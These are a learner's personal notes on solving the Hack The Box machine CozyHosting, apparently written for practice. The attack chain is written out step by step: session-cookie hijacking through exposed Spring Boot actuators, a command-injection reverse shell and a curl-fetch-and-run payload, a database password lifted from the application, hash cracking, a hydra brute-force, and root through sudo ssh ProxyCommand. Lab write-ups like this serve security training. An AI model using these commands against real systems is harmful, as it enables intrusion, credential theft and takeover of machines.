
The cozyhosting folder , and other three and then nmap

```
┌──(cds㉿kali)-[~/Documents/htb/CozyHosting/nmap]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -Pn -n 10.10.11.230 -oN allports
[sudo] password for cds: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 16:33 EDT
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

so we have a website called "http://cozyhosting.htb/" and a ssh

whatweb gives us this

```
┌──(cds㉿kali)-[~/Documents/htb/CozyHosting/nmap]
└─$ whatweb http://cozyhosting.htb/   
http://cozyhosting.htb/ [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.230], Lightbox, Script, Title[Cozy Hosting - Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```

the launchpad of the ssh service "OpenSSH 8.9p1 Ubuntu 3ubuntu0.3" it is a 
```
Jammy
```

I found a mail ;

![[Screenshot_2023-09-07_10_20_47.png]]

I have a log in and i think i can create an account, or maybe no

![[Screenshot_2023-09-07_10_57_03.png]]


The server is nginx and i found this online 

https://github.com/stark0de/nginxpwner

Nginxpwner is a simple tool to look for common Nginx misconfigurations and vulnerabilities.

This do not help me so much...


Now i was using ffluf in this way

AND I TRIED SUB DIRECTORIES TO!!!!!

I was trying to found some directorys 
```
ffuf -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://cozyhosting.htb/FUZZ
```

And i try extensions too... but i dont found really much, even i used gobuster

I found :

```
admin
logout
error
login
27079%5Fclassicpeople2%2Ejpg
```


I was reading over there that maybe spring bot is working on this machine.. if i wont have read this i really never would be able to found it 
```
ffuf -c -w /home/cds/Downloads/spring-boot.txt -u http://cozyhosting.htb/FUZZ
```

QUE ES SPRING BOT ?

Traducción del inglés-Spring Boot Extension es la solución de convención sobre configuración de Spring para crear aplicaciones Spring de nivel de producción con cantidades mínimas de configuración.

How would I found the the resource of spring bot ? in this way (watching the error site http://cozyhosting/error)

There was an unexpected error (type=None, status=999).
https://www.google.com/search?q=There+was+an+unexpected+error+%28type%3DNone%2C+status%3D999%29.&sca_esv=563475517&source=hp&ei=xjD6ZJmwOdjY1sQP87aQgAU&iflsig=AD69kcEAAAAAZPo-1kAtQsoSycYRrk5lPj6fxWVdJwkJ&ved=0ahUKEwiZq57WqZmBAxVYrJUCHXMbBFAQ4dUDCAk&uact=5&oq=There+was+an+unexpected+error+%28type%3DNone%2C+status%3D999%29.&gs_lp=Egdnd3Mtd2l6IjZUaGVyZSB3YXMgYW4gdW5leHBlY3RlZCBlcnJvciAodHlwZT1Ob25lLCBzdGF0dXM9OTk5KS4yBxAAGBMYgAQyCBAAGBYYHhgTSMkEUABYAHAAeACQAQCYAb8CoAG_AqoBAzMtMbgBA8gBAPgBAvgBAeIDBRIBMSBA&sclient=gws-wiz

Google says something of spring boot 



so with this o found this other things:
```
[Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 961ms]
    * FUZZ: actuator

[Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 1002ms]
    * FUZZ: actuator/env

[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 1200ms]
    * FUZZ: actuator/env/home

[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 702ms]
    * FUZZ: actuator/env/lang

[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 684ms]
    * FUZZ: actuator/env/path

[Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 625ms]
    * FUZZ: actuator/health

[Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 612ms]
    * FUZZ: actuator/mappings

[Status: 200, Size: 195, Words: 1, Lines: 1, Duration: 614ms]
	    * FUZZ: actuator/sessions

[Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 1040ms]
    * FUZZ: actuator/beans

```



I watched this... on sessions acutators, maybe is some system user

```
"64F16CA11B7B479440E3C532038018BF":"kanderson"
```

## FEROXBUSTER##

I read over there some guy, that there is a tool that found directorys and more too



Im trying a bruteforce attack with hydra...
```
	hydra -l admin  -P /usr/share/wordlists/rockyou.txt cozyhosting.htb http-post-form '/login:username=^USER^&password=^PASS^&Login=Login:Invalid username or password' 
```
This helped me a loot when I do not remember how to do it on internet
Remember do not put "http://" before the cozyhosting.htb, this drops you mistakes
https://www.youtube.com/watch?v=rvme2kE8-jY



The bruteforce attack was just for my knowledge. What it realy cares is that if you change your actual cookie for the other one that we found on actuator/sessions we are able to get inside the admin panel. as K.anderson


I think this is some kind of remote command execution.


This suggests that an operating system command is executed when sending a `POST` request to the '/executessh' action. It led me to consider the possibility of an OS command injection. Indeed, I successfully executed the 'id' command via the 'username' parameter, yielding the result: `uid=1001(app)`


Apparently here we can execute commands or make a reverse shell here, i need a guide to do this machine, because im a fkn noob.. :(


Ok , this guy is saying that we need to encode this on base64 because the spaces and the & for sure is making probems... 

this is the payload
```
echo "bash -i>& /dev/tcp/10.10.16.45/4444 0>&1" | base64
```
this is the output
```
YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzQ0NDQgMD4mMQo=
```


This is connected to the victim machine, on ubuntu. The hostname, that we need to refer is 127.0.0.1, it is the local host. In the input of the username we can put the payload, in this case, this guy uses curl, for download the file that we are going to put.
![[Screenshot_2023-09-08_14_25_34.png]]

The action of the form, its an "/executessh" and the method is "post". I dont know why this have this name... but it is like it is. And apparently  this makes me able to execute commands.

![[Screenshot_2023-09-08_14_29_42.png]]

So I created this payload
![[Screenshot_2023-09-08_14_35_25.png]]

And now... i must make  a python server.


This is what the guy says in his web walkthrough 
```
After a series of trial and error attempts, I discovered that using individual flags such as `-d` didn't yield the desired results, as they seemed to isolate commands from one another. Consequently, I opted to develop a Bash script named "revS.sh" and subsequently uploaded it to the target machine.

    #!/bin/bash
    echo base64EncodedPayload | base64 -d | bash
    
    chmod +x revS.sh
    // Then I saved and named it as revS.sh
    python3 -m http.server 8888
            

To get the payload from my machine I used the following OS command injection: `host=127.0.0.1&username=;$(curl{IFS}$MyIP:8888/revS.sh|bash)`  
`{IFS}` I used this because there was a WAF that blocked whitespaces  
`revS.sh` it's the payload I created earlier
```


Ok, this doesnt work so im not doing something ok...

y put this: 

on the first input (THIS CAN BE ANYTHING !! LIKE 123 AND IT WILL WORK TOO !!)
```
127.0.0.1
```
on the second one
```
root;`$curl${IFS}$10.10.16.45:8888/rev.sh|bash`
```

and this was the response on the website

```
http://cozyhosting.htb/admin?error=ssh:%20Could%20not%20resolve%20hostname%20root:%20Temporary%20failure%20in%20name%20resolution/bin/bash:%20line%201:%200.10.16.45:8888/rev.sh:%20No%20such%20file%20or%20directory/bin/bash:%20line%201:%20@127.0.0.1:%20command%20not%20found
```

I will quit, because Im not understanding nothing. This is very advanced to me i think.... good bye.


I'm here again, I change the strategy, just watch for another person who resolve it, but now im using another payload, and it worked... Im listening with nc on the 4444

and the payload is this :


## The hardest part ##


basically the place on 
```
;echo${IFS}"YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzQ0NDQgMD4mMQopayl="|base64${IFS}-d|bash;
```
So, what is IFS ???

La variable de entorno IFS que significa Internal Field Separator (separador de campos internos), sirve para indicar que valor se usa como separador. Puede usarse para varios trucos de los cuales pongo a continuación los más interesantes:

Here we have some explanations : https://www.imd.guru/sistemas/bash/ifs.html

https://www.reiser.cl/linux-uso-de-ifs-y-comando-read-en-scripts-bash/


Ok, we are in.. on the app folder

![[Screenshot_2023-09-09_12_15_51.png]]
	we must download the jar file to our machine

so on the target create a python  server
```
python -m http.server 8888
```

and on my pc I downloaded with

```
wget 10.10.11.230:8888/cloudhosting-0.0.1.jar
```

We now have the file, to unzip it change the name of the extension from jar to zip

now we search on the folders a file called application.properties, inside of it we have access to the postgress password

```
┌──(cds㉿kali)-[~/…/CozyHosting/content/BOOT-INF/classes]
└─$ cat application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR             
```

Maybe with this password we can get inside of the machine via ssh

spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR 

so.. no.

we need to get inside postgress, with this command

```
psql "postgresql://$DB_USER:$DB_PWD@$DB_SERVER/$DB_NAME"
```

this is the way to get in
```
psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost/postgres"
```


https://www.commandprompt.com/education/postgresql-list-all-tables/#:~:text=PostgreSQL%20provides%20a%20%E2%80%9C%5Cdt%E2%80%9D,size%2C%20access%20method%2C%20etc.

This is quite different than MYSQL to see the databases you must use 
```
\ł
```
to select a database 
```
\c databasename
```
to see the tables
```
\dt
```
like "less" on linux
```
\dt+ is like "less" on linux
```




This is without ('')... because it doesnt work !!!!!
```
SELECT * FROM users ;
```

So finally we find this ;

Now we have to replace it with another password... the admin i think
```
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

Another way is cracking the password with John


I did two files adminhash.txt and kandersonhash.txt


THIS DO NOT WORK FOR ME 
```
**john -w /usr/share/wordlists/rockyou.txt hash.txt**
```


The system haves a user called josh
```
app@cozyhosting:/app$ cd ..
app@cozyhosting:/$ ls
app  boot  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  var
bin  dev   home  lib32  libx32  media       opt  root  sbin  sys  usr
app@cozyhosting:/$ cd /home
app@cozyhosting:/home$ ls
josh
app@cozyhosting:/home$ whoami
app
app@cozyhosting:/home$ 

```


this is the other way to break hashes

```
sudo hashcat -m 3200 adminhash.txt /usr/share/wordlists/rockyou.txt 
```

maybe this would work:

```
sudo john -w:/home/cds/Downloads/rockyou.txt hash.txt
```


AND THIS LAST WORKED FOR ME !!!! 

![[Screenshot_2023-09-09_15_50_52.png]]

The password is manchesterunited, and the user of the system is josh. So lets try to connect via ssh


This are the perm that john can do on system as root. without password
```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
josh@cozyhosting:~$ 

```

with this commands I can be root

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

this are the flags:

```
user.txt
# cat user.txt  
76bcc1f623796c9e8642b26f24b52435
# cd /root      
# ls
root.txt
# cat root.txt  
84ab2d144348ac1650c2cd286cd8be37
# 

```
if you want to see beter the ( # ) you must write bash
```
# bash
root@cozyhosting:~# 
```


we did it!!!!!!